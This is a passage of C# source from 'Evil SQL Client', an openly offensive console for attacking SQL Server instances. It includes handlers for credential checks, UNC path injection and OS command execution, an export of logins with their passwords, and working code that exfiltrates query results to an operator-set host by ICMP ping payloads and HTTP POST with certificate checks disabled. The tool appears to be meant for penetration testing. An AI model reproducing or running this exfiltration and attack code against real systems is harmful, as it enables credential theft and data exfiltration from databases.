                        EvilCommands.MasterDiscoveredList.Clear();
                        Console.Write("\nThe list of discovered instances has been cleared.\n");
                    }
                    else if (multiline = MyQuery.Check("show access"))
                    {
                        ShowAccess();
                    }
                    else if (multiline = MyQuery.Check("export access"))
                    {

                        string[] filePath1 = MyQuery.ToLower().Split(new string[] { " " }, StringSplitOptions.RemoveEmptyEntries);

                        string targetPath = string.Empty;
                        if (filePath1.Length > 2)
                        {
                            targetPath = filePath1[2];
                        }

                        string InstanceOnly = string.Empty;
                        if (filePath1.Length > 3)
                        {
                            InstanceOnly = filePath1[3];
                        }

                        // Unique the list
                        DataView AccessView = new DataView(EvilCommands.MasterAccessList);
                        DataTable distinctValues = AccessView.ToTable(
                            true,
                            "Instance",
                            "DomainName",
                            "ServiceProcessID",
                            "ServiceName",
                            "ServiceAccount",
                            "AuthenticationMode",
                            "ForcedEncryption",
                            "Clustered",
                            "SQLServerMajorVersion",
                            "SQLServerVersionNumber",
                            "SQLServerEdition",
                            "SQLServerServicePack",
                            "OSArchitecture",
                            "OsVersionNumber",
                            "CurrentLogin",
                            "CurrentLoginPassword",
                            "IsSysadmin"
                        );

                        StringBuilder fileContent = new StringBuilder();

                        if (InstanceOnly.Equals(string.Empty))
                        {
                            // Write headers
                            foreach (var col in distinctValues.Columns)
                            {
                                fileContent.Append(col.ToString() + ",");
                            }

                            // Write Data 
                            fileContent.Replace(",", Environment.NewLine, fileContent.Length - 1, 1);
                            foreach (DataRow dr in distinctValues.Rows)
                            {
                                foreach (var column in dr.ItemArray)
                                {
                                    fileContent.Append("\"" + column.ToString() + "\",");
                                }

                                fileContent.Replace(",", Environment.NewLine, fileContent.Length - 1, 1);
                            }
                        }

                        // Write instance only 
                        if (!InstanceOnly.Equals(""))
                        {
                            foreach (DataRow myrow in distinctValues.Rows)
                            {
                                fileContent.Append(myrow["Instance"].ToString() + "\n");
                            }
                        }

                        try
                        {
                            // write file output
                            File.WriteAllText(targetPath, fileContent.ToString());
                            Console.WriteLine("\n" + EvilCommands.MasterAccessList.Rows.Count + " instances were written to " + targetPath);
                        }
                        catch
                        {
                            Console.WriteLine("\nUnable to write file.\n");
                        }
                    }
                    else if (multiline = MyQuery.Check("clear access"))
                    {
                        EvilCommands.MasterAccessList.Clear();
                        Console.WriteLine("\nThe list of instances that can be logged into has been cleared.");
                    }
                    #endregion

                    // ----------------------------------------------------
                    // DATA EXFILTRATION SETTINGS 
                    // ----------------------------------------------------
                    #region data exfiltration settings 
                    else if (multiline = MyQuery.Check("set file "))
                    {
                        ExportFileStateG = MyQuery.EnableDisable("set file ");
                        Console.WriteLine($"\nExfiltrating query results to a file has been {(ExportFileStateG ? "enabled\nDon't forget to set the filepath setting." : "disabled")} ");
                    }
                    else if (multiline = MyQuery.Check("set filepath "))
                    {
                        ExportFilePathG = MyQuery.ToLower().Replace("set filepath ", "");
                        Console.WriteLine($"\nQuery results will be exported to {ExportFilePathG}.");
                    }
                    else if (multiline = MyQuery.Check("set icmp "))
                    {
                        IcmpStateG = MyQuery.EnableDisable("set icmp ");
                        Console.WriteLine($"\nExfiltrating query results via ICMP has been {(IcmpStateG ? "enabled\nDon't forget to configure the ICMPIP setting." : "disabled")} ");
                    }
                    else if (multiline = MyQuery.Check("set icmpip "))
                    {
                        IcmpIpG = MyQuery.ToLower().Replace("set icmpip ", string.Empty); ;
                        Console.WriteLine($"\nICMP IP set to {IcmpIpG}.");
                    }
                    else if (multiline = MyQuery.Check("set http "))
                    {
                        HttpStateG = MyQuery.EnableDisable("set http ");
                        Console.WriteLine($"\nExfiltrating query results via HTTP POST has been {(HttpStateG ? "enabled\nDon't forget to set the HTTPURL setting." : "disabled")} ");
                    }
                    else if (multiline = MyQuery.Check("set httpurl "))
                    {
                        HttpUrlG = MyQuery.ToLower().Replace("set httpurl ", string.Empty);
                        Console.WriteLine($"\nHTTP URL set to {HttpUrlG}.");
                    }
                    #endregion

                    // ----------------------------------------------------
                    // DATA ENCRYPTION SETTINGS 
                    // ----------------------------------------------------
                    #region data encryption settings 
                    else if (multiline = MyQuery.Check("set encryption "))
                    {
                        EncStateG = MyQuery.EnableDisable("set Encryption ");
                        Console.WriteLine($"\nData encryption has been {(EncStateG ? "enabled\nDon't forget update the key and salt." : "disabled")} ");
                    }
                    else if (multiline = MyQuery.Check("set enckey "))
                    {
                        EncKeyG = MyQuery.Replace("set enckey ", string.Empty);
                        Console.WriteLine($"\nEncryption key set to: {EncKeyG}");
                    }
                    else if (multiline = MyQuery.Check("set encsalt "))
                    {
                        EncSaltG = MyQuery.Replace("set encsalt ", string.Empty);
                        Console.WriteLine($"\nEncryption salt set to: {EncSaltG}");
                    }
                    #endregion

                    // ----------------------------------------------------
                    // OFFENSIVE COMMANDS 
                    // ----------------------------------------------------
                    #region offensive commands 
                    else if (multiline = MyQuery.Check("check access"))
                    {
                        CheckAccess();
                    }
                    else if (multiline = MyQuery.Check("check defaultpw"))
                    {
                        CheckDefaultAppPw();
                    }
                    else if (multiline = MyQuery.Check("list databases"))
                    {
                        ListDatabase();
                    }
                    else if (multiline = MyQuery.Check("list tables"))
                    {
                        ListTable();
                    }
                    else if (multiline = MyQuery.Check("list serverinfo"))
                    {
                        ListServerInfo();
                    }
                    else if (multiline = MyQuery.Check("list rolemembers"))
                    {
                        ListRoleMembers();
                    }
                    else if (multiline = MyQuery.Check("list links"))
                    {
                        ListLinks();
                    }
                    else if (multiline = MyQuery.Check("list logins"))
                    {
                        ListLogins();
                    }
                    else if (multiline = MyQuery.Check("list privs"))
                    {
                        ListPrivs();
                    }
                    else if (multiline = MyQuery.Check("check loginaspw"))
                    {
                        CheckLoginAsPw();
                    }
                    else if (multiline = MyQuery.Check("check uncinject "))
                    {
                        CheckUncPathInjection(MyQuery.Replace("check uncinject ", string.Empty));
                    }
                    else if (multiline = MyQuery.Check("run oscmd "))
                    {
                        RunOsCmd(MyQuery.Replace("run oscmd ", string.Empty));
                    }
                    #endregion

                    // ----------------------------------------------------
                    // MISC COMMANDS 
                    // ----------------------------------------------------
                    #region misc commands 
                    else if (multiline = MyQuery.Check("set verbose"))
                    {
                        VerboseG = MyQuery.EnableDisable("set verbose ");
                        Console.Write($"\nVerbose errors messages have been {(VerboseG ? "enabled" : "disabled")}.\n");
                    }
                    else if (MyQuery.Check("clear"))
                    {
                        Console.Clear();
                        fullcommand = "";
                        Console.WriteLine("----------");
                    }
                    else if (multiline = MyQuery.Check("show settings"))
                    {
                        fullcommand = "";
                        Console.WriteLine("\n------------------------------------");
                        Console.WriteLine("    Evil SQL Client (ESC) v1.0");
                        Console.WriteLine("------------------------------------");
                        Console.WriteLine("       CONNECTION SETTINGS   ");
                        Console.WriteLine("------------------------------------");
                        Console.WriteLine(" ConnString : " + ConnectionStringG);
                        Console.WriteLine(" TargetAll  : " + InstanceAllG);
                        Console.WriteLine(" Instance   : " + InstanceG);
                        Console.WriteLine(" Username   : " + UsernameG);
                        Console.WriteLine(" Password   : " + PasswordG);
                        Console.WriteLine(" UserType   : " + UsertypeG);
                        Console.WriteLine(" Timeout    : " + TimeOutG);
                        Console.WriteLine(" Verbose    : " + VerboseG);

                        Console.WriteLine("\n------------------------------------");
                        Console.WriteLine("    DATA EXFILTRATION SETTINGS      ");
                        Console.WriteLine("------------------------------------");
                        Console.WriteLine(" FILE	   : " + ExportFileStateG);
                        Console.WriteLine(" FILEPATH   : " + ExportFilePathG);
                        Console.WriteLine(" ICMP       : " + IcmpStateG);
                        Console.WriteLine(" ICMPIP     : " + IcmpIpG);
                        Console.WriteLine(" HTTP       : " + HttpStateG);
                        Console.WriteLine(" HTTPURL    : " + HttpUrlG);
                        Console.WriteLine(" Encryption : " + EncStateG);
                        Console.WriteLine(" EncKey     : " + EncKeyG);
                        Console.WriteLine(" EncSalt    : " + EncSaltG);
                        Console.WriteLine("------------------------------------\n");
                        // Console.Write("SQLCLIENT> ");
                    }
                    else if (multiline = (MyQuery.Check("help") || MyQuery.Check("show help")))
                    {
                        GetHelp();
                        fullcommand = "";
                        Console.WriteLine("----------");
                    }
                    #endregion
                    else
                    {
                        multiline = false;
                    }
                }
                while (MyQuery.ToLower() != "go");

                // ------------------------------------------------------------
                //  PERFORM QUERY - SINGLE INSTANCE AND TARGETALL SUPPORTED
                // ------------------------------------------------------------
                CheckQueryReady();
                if (!ReadyforQueryG)
                {
                    Console.WriteLine("\nNo target instances have been defined.\n");
                    return true;
                }

                // Create data table 
                IList<string> TargetList = new List<string>();

                // Add all
                if (InstanceAllG)
                {
                    // Add all
                    // https://www.c-sharpcorner.com/UploadFile/0f68f2/querying-a-data-table-using-select-method-and-lambda-express/									   
                    if (InstanceAllG)
                    {
                        foreach (DataRow CurrentRecord in EvilCommands.MasterAccessList.Select())
                        {
                            TargetList.Add(CurrentRecord["Instance"].ToString());
                        }
                    }
                }

                // Add instance
                if (!string.IsNullOrEmpty(InstanceG))
                {
                    TargetList.Add(InstanceG);
                }

                // Get list count
                var count = TargetList.Count;
                Console.WriteLine("\n" + count + " instances will be targeted.\n");

                // Loop through target list 
                foreach (var instance in TargetList)
                {
                    Console.WriteLine("\n" + instance + ": ATTEMPTING QUERY");
                    try
                    {
                        // ----------------------------
                        // Setup connection string
                        // ----------------------------
                        string ConnectionString = CreateConnectionString(instance, UsernameG, PasswordG, UsertypeG, "master");

                        // ----------------------------
                        // Execute query	
                        // ----------------------------							
                        SqlConnection conn = new SqlConnection(ConnectionString);
                        SqlCommand QueryCommand = new SqlCommand(fullcommand, conn);
                        conn.Open();

                        // Execute query and read data into data table
                        DataTable dt = new DataTable();
                        SqlDataAdapter da = new SqlDataAdapter(QueryCommand);
                        da.Fill(dt);

                        // Display results 	
                        DataRow[] currentRows = dt.Select(null, null, DataViewRowState.CurrentRows);
                        if (currentRows.Length < 1)
                        {
                            Console.WriteLine("\nNo rows returned.\n");
                        }
                        else
                        {
                            Console.WriteLine("\nQUERY RESULTS:\n");

                            foreach (DataColumn column in dt.Columns)
                            {
                                Console.Write("\t{0}", column.ColumnName);
                            }

                            Console.WriteLine("\t");

                            foreach (DataRow row in currentRows)
                            {
                                foreach (DataColumn column in dt.Columns)
                                {
                                    Console.Write("\t{0}", row[column]);
                                }

                                Console.WriteLine("\t");
                            }
                            Console.WriteLine("\t");
                        }

                        // ----------------------------
                        // Encrypt data
                        // ----------------------------
                        if (EncStateG)
                        {
                            Console.WriteLine("\nEncrypting data.");
                            // encrypt exfil encryption
                            //string enableEncryption = "false";
                            //string mySharedSecret = "changethis";
                            //string encrypted64 = EncryptStringAES(fileContent.ToString(), EncKeyG);	
                        }

                        // ----------------------------
                        // Exfiltrate data to file
                        // ----------------------------
                        if (ExportFileStateG)
                        {
                            StringBuilder fileContent = new StringBuilder();

                            foreach (var col in dt.Columns)
                            {
                                fileContent.Append(col.ToString() + ",");
                            }

                            fileContent.Replace(",", Environment.NewLine, fileContent.Length - 1, 1);
                            foreach (DataRow dr in dt.Rows)
                            {
                                foreach (var column in dr.ItemArray)
                                {
                                    fileContent.Append("\"" + column.ToString() + "\",");
                                }

                                fileContent.Replace(",", Environment.NewLine, fileContent.Length - 1, 1);
                            }

                            try
                            {
                                // write file output
                                File.AppendAllText(ExportFilePathG, fileContent.ToString());
                                Console.WriteLine("\nSuccessfully wrote file to " + ExportFilePathG + "\n");
                            }
                            catch
                            {
                                Console.WriteLine("\nUnable to write file.\n");
                            }
                        }

                        // ----------------------------
                        // Exfiltrate data to icmp
                        // ----------------------------
                        if (IcmpStateG)
                        {
                            Console.WriteLine("Exfiltrating results via ICMP to: " + IcmpIpG + "\n");

                            // Create content to send
                            StringBuilder fileContent = new StringBuilder();

                            foreach (var col in dt.Columns)
                            {
                                fileContent.Append(col.ToString() + ",");
                            }

                            fileContent.Replace(",", System.Environment.NewLine, fileContent.Length - 1, 1);
                            foreach (DataRow dr in dt.Rows)
                            {
                                foreach (var column in dr.ItemArray)
                                {
                                    fileContent.Append("\"" + column.ToString() + "\",");
                                }

                                fileContent.Replace(",", System.Environment.NewLine, fileContent.Length - 1, 1);
                            }


                            // Create string to be sent in ICMP payload
                            string data = fileContent.ToString();

                            // Source: https://docs.microsoft.com/en-us/dotnet/api/system.net.networkinformation.ping?view=netframework-4.7.2
                            Ping pingSender = new Ping();
                            PingOptions options = new PingOptions();

                            // Use the default Ttl value which is 128, but change the fragmentation behavior.
                            int timeout = 120;
                            options.DontFragment = true;

                            // Create a buffer of data to be transmitted.
                            byte[] buffer = Encoding.ASCII.GetBytes(data);
                            PingReply reply = pingSender.Send(IcmpIpG, timeout, buffer, options);
                            Console.WriteLine("ICMP exfiltration is complete.\n");
                        }

                        // ----------------------------
                        // Exfiltrate data to http post
                        // ----------------------------
                        if (HttpStateG)
                        {
                            Console.WriteLine("Exfiltrating results to URL: " + HttpUrlG + "\n");

                            // Create content to send
                            StringBuilder fileContent = new StringBuilder();

                            foreach (var col in dt.Columns)
                            {
                                fileContent.Append(col.ToString() + ",");
                            }

                            fileContent.Replace(",", Environment.NewLine, fileContent.Length - 1, 1);
                            foreach (DataRow dr in dt.Rows)
                            {
                                foreach (var column in dr.ItemArray)
                                {
                                    fileContent.Append("\"" + column.ToString() + "\",");
                                }

                                fileContent.Replace(",", Environment.NewLine, fileContent.Length - 1, 1);
                            }

                            // Create string to be sent in ICMP payload
                            string mydata = fileContent.ToString();
                            byte[] postArray1 = Encoding.ASCII.GetBytes(mydata);

                            try
                            {
                                // Trust all SSL certs
                                ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };

                                // Turn on TLS 1.1 and 1.2 without affecting other protocols:
                                ServicePointManager.SecurityProtocol |= SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;

                                // Create webclient and send payload 																							
                                WebClient myWebClient1 = new WebClient();
                                myWebClient1.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
                                byte[] responseArray1 = myWebClient1.UploadData(HttpUrlG, "POST", postArray1);
                                //Console.WriteLine("\nResponse received was :{0}", Encoding.ASCII.GetString(responseArray1));		
                            }
                            catch
                            {
                                // catch(System.Net.WebException ex1)
                                // Console.WriteLine("HTTP POST FAILED: " + ex1.Message + "\n");									
                            }

                            Console.WriteLine("Exfiltration complete.\n");
                        }

                    }
                    catch (SqlException ex)
                    {
                        Console.WriteLine(instance + ": CONNECTION OR QUERY FAILED");
                        if (VerboseG)
                        {
                            Console.WriteLine("\n" + ex.Errors[0].Message + "\n");
                        }
                    }
                }

                // Return to console 
                // EvilCommands.RunSQLConsole();
                return true;
            }
        }
    }

    public static class StringExtention
    {
        public static bool Check(this string source, string toCheck)
        {
            return source?.IndexOf(toCheck, StringComparison.OrdinalIgnoreCase) >= 0;
        }

        public static bool EnableDisable(this string source, string toCheck)
        {
            try
            {
                return source.ToLower().Replace(toCheck, string.Empty) switch
                {
                    "enabled" => true,
                    "true" => true,
                    "disabled" => false,
                    "false" => false,
                    _ => throw new Exception("Invalid Setting Specified")
                };
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                return false;
            }
        }
    }
}
